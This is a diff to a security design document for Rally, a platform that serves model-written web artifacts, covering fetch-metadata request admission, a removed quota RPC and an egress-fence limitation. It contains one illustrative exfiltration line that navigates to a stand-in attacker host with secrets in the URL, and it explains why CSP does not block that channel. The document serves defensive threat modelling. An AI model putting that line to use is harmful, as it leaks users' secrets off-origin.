@@ -128,8 +128,8 @@ Rally assembles the dynamic worker's `modules` map, so the facet never loads the
 model's class directly: a Rally-authored module imports `SiteData` and runs a host
 class that **instantiates it and holds it as a field**, passing the same `ctx`.
 Both objects address one database while living on separate prototype chains, so
-the host answers RPCs the model's code never defined — describe, query, page,
-size — over the same rows the page reads and writes.
+the host answers RPCs the model's code never defined — describe, query, page —
+over the same rows the page reads and writes.
 
 Requests to a stateful artifact route *through* the supervisor rather than being
 served in the loader's own isolate. That is a platform constraint rather than a
@@ -147,9 +147,18 @@ is the only place that can forward into it.
   artifacts are same-*site*: `SameSite` does not stop script in artifact A
   sending a credentialed request to artifact B, and a simple `POST` needs no
   preflight, so B's model-written handler would still run. Requests are admitted
-  only when fetch metadata says `same-origin`, or `none` for a genuine top-level
-  `GET`. **GETs are refused too** — artifact code may treat any method as a
-  write, and nothing about a model-written handler makes it safe by method.
+  only when fetch metadata says `same-origin`, or when the request *is* a
+  top-level document navigation — `Sec-Fetch-Mode: navigate` with
+  `Sec-Fetch-Dest: document`, on a `GET`. **`Sec-Fetch-Site: none` is the wrong
+  test** and was the first thing written here: it covers an address bar and a
+  bookmark, but a link click or a redirect from anywhere else sends
+  `cross-site`, so keying on it would refuse the ordinary act of following a
+  link to an artifact you can already see. Classifying on what the request is
+  keeps the boundary intact, because a document navigation cannot carry a body
+  a page composed, and the sub-resource requests that *are* the attack never
+  reach that branch. **Cross-origin GETs are refused too** — artifact code may
+  treat any method as a write, and nothing about a model-written handler makes
+  it safe by method.
 - **The CSP's `script-src` and `style-src` must stay written out.** `'self'`
   does not permit inline code, so inheriting `default-src` would refuse the
   inline `<script>` and `<style>` model-authored pages are built from and break
@@ -190,7 +199,15 @@ is the only place that can forward into it.
   off-origin navigation is refused, not opened externally: `location = "https://
   attacker/?" + secrets` is a navigation, which `connect-src` and `form-action`
   do not touch, and opening it would make Rally perform the exfiltration the
-  egress fence exists to prevent.
+  egress fence exists to prevent. **In a plain browser tab that channel stays
+  open**, and no header closes it — CSP has no directive over where a document
+  navigates itself. So the egress fence is honestly two claims, not one: no
+  artifact can *fetch, load, beacon, or post* off-origin anywhere, and in
+  Rally's own surfaces it cannot navigate off-origin either. A page opened in
+  a browser can still put what it can see into a URL bar the person watches it
+  land in — which is the reason the desktop refuses rather than hands off, and
+  the reason this is written down rather than left as an assumed property of
+  the CSP.
 - **The asset manifest is the only index.** Nothing resolves a path the manifest
   does not name, which is what makes the server module's absence from `assets` a
   real 404 rather than a convention.
@@ -331,6 +348,32 @@ Worker's waistline is deliberately minimal, so a compromise of it exposes
 artifact content and viewer sessions rather than workspace authority.
 
 ## Changelog
+
+### 2026-09-01 — Review triage: drop the quota leftover, correct three claims
+
+**What changed:** Removed the facet host's `rallySize`, and corrected three
+statements in this document that no longer matched the code.
+
+**Why:** Review found that a 100 MB write ceiling could not be enforced from a
+host that composes the model's class — artifact code writes through its own
+native `ctx.storage` handle during any method, GET included, so the threshold
+could be crossed by an unbounded amount before any check ran, and refusing the
+*next* request would have blocked reads without restoring the bound. The
+promise was dropped rather than reworded, but its read stayed behind as an
+unreachable RPC method on a security boundary; it is gone now, and this
+document's RPC list no longer names it.
+
+The other two are the more instructive kind. The fetch-metadata rule shipped
+classifying on `Sec-Fetch-Mode`/`Sec-Fetch-Dest` after review showed
+`Sec-Fetch-Site: none` misses link clicks and redirects — but this document was
+left describing the rule the code had *stopped* applying, which is worse than
+either version alone, because the next reader would have trusted it. And the
+off-origin navigation refusal was written as though it were a property of the
+fence rather than of the desktop container: CSP has no directive over where a
+document navigates itself, so in a plain browser tab the channel is open. A
+future change must respect that this is deliberately two claims — no off-origin
+*fetch* anywhere, no off-origin *navigation* in Rally's own surfaces — and not
+collapse them back into one by adding a header that appears to cover both.
 
 ### 2026-09-01 — The publish, serving, and facet layers land
 
